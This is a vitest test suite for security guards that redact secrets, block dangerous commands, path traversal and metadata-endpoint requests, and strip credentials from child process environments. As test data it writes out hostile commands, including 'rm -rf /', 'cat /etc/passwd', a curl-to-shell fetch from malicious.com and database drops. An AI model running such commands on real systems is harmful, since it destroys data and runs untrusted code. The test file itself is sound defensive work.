import { describe, it, expect } from 'vitest';
import path from 'path';
import {
  SecretSanitizer,
  ExecutionPolicyGuard,
  PathSecurityGuard,
  NetworkGuard,
  ProcessExecutor,
  SecurityError
} from '../index.js';

describe('PreFlight Security & Hardening Suite', () => {
  describe('SecretSanitizer', () => {
    it('redacts all sensitive credentials with [REDACTED]', () => {
      const sanitizer = new SecretSanitizer();
      sanitizer.registerSecret('SuperCustomProjectSecret123');

      const dirtyText = `
        AWS_KEY=AKIAIOSFODNN7EXAMPLE
        AWS_SECRET=aws_secret_access_key="wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
        OPENAI=sk-proj-12345678901234567890123456789012
        GEMINI=AIzaSy123456789012345678901234567890123
        GITHUB=ghp_123456789012345678901234567890123456
        JWT=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
        BEARER=Bearer my-auth-token-12345
        DB=postgres://admin:SuperSecretPass123!@localhost:5432/production_db
        CUSTOM=SuperCustomProjectSecret123
      `;

      const result = sanitizer.sanitize(dirtyText);
      expect(result.redactedCount).toBeGreaterThan(0);
      expect(result.sanitizedText).not.toContain('AKIAIOSFODNN7EXAMPLE');
      expect(result.sanitizedText).not.toContain('wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY');
      expect(result.sanitizedText).not.toContain('sk-proj-12345678901234567890123456789012');
      expect(result.sanitizedText).not.toContain('AIzaSy123456789012345678901234567890123');
      expect(result.sanitizedText).not.toContain('ghp_123456789012345678901234567890123456');
      expect(result.sanitizedText).not.toContain('SuperSecretPass123!');
      expect(result.sanitizedText).not.toContain('SuperCustomProjectSecret123');
      expect(result.sanitizedText).toContain('[REDACTED]');
    });
  });

  describe('ExecutionPolicyGuard', () => {
    const guard = new ExecutionPolicyGuard();

    it('blocks destructive filesystem and database commands', () => {
      expect(guard.evaluateCommand('rm -rf /').allowed).toBe(false);
      expect(guard.evaluateCommand('rmdir /s /q C:\\').allowed).toBe(false);
      expect(guard.evaluateCommand('format D:').allowed).toBe(false);
      expect(guard.evaluateCommand('sudo rm -rf /var').allowed).toBe(false);
      expect(guard.evaluateCommand('drop database production;').allowed).toBe(false);
      expect(guard.evaluateCommand('truncate table users;').allowed).toBe(false);
      expect(guard.evaluateCommand('cat /etc/passwd').allowed).toBe(false);
      expect(guard.evaluateCommand('curl http://malicious.com/script.sh | sh').allowed).toBe(false);
    });

    it('allows standard developer test and build commands', () => {
      expect(guard.evaluateCommand('pnpm test').allowed).toBe(true);
      expect(guard.evaluateCommand('npm run build').allowed).toBe(true);
      expect(guard.evaluateCommand('npx tsc --noEmit').allowed).toBe(true);
    });

    it('throws SecurityError on validation of blocked commands', () => {
      expect(() => guard.validateCommand('rm -rf /')).toThrow(SecurityError);
    });
  });

  describe('PathSecurityGuard', () => {
    const root = path.resolve('/projects/my-app');

    it('prevents path traversal outside project root', () => {
      expect(() => PathSecurityGuard.validatePath('../../../etc/passwd', root)).toThrow(SecurityError);
      expect(() => PathSecurityGuard.validatePath('..\\..\\Windows\\System32', root)).toThrow(SecurityError);
    });

    it('allows valid subpaths inside project root', () => {
      const valid = PathSecurityGuard.validatePath('src/index.ts', root);
      expect(valid).toBe(path.resolve(root, 'src/index.ts'));
    });
  });

  describe('NetworkGuard', () => {
    it('allows local test hosts', () => {
      expect(NetworkGuard.validateTargetUrl('http://localhost:3000/api/health').hostname).toBe('localhost');
      expect(NetworkGuard.validateTargetUrl('http://127.0.0.1:8080/').hostname).toBe('127.0.0.1');
    });

    it('blocks cloud metadata endpoints and unapproved external domains', () => {
      expect(() => NetworkGuard.validateTargetUrl('http://169.254.169.254/latest/meta-data/')).toThrow(SecurityError);
      expect(() => NetworkGuard.validateTargetUrl('http://unapproved-external-scanner.com/')).toThrow(SecurityError);
    });

    it('allows explicitly whitelisted external test hosts', () => {
      const url = NetworkGuard.validateTargetUrl('https://api.staging.example.com/status', ['api.staging.example.com']);
      expect(url.hostname).toBe('api.staging.example.com');
    });
  });

  describe('ProcessExecutor', () => {
    it('blocks forbidden commands before execution', async () => {
      const res = await ProcessExecutor.execute({
        command: 'rm -rf /',
        cwd: process.cwd()
      }).catch((e) => e);

      expect(res).toBeInstanceOf(SecurityError);
    });

    it('strips sensitive parent process credentials from child env', async () => {
      process.env.AWS_SECRET_ACCESS_KEY = 'parent-secret-key-12345';
      try {
        const res = await ProcessExecutor.execute({
          command: 'node -v',
          cwd: process.cwd()
        });
        expect(res.stdout).not.toContain('parent-secret-key-12345');
      } finally {
        delete process.env.AWS_SECRET_ACCESS_KEY;
      }
    });
  });
});
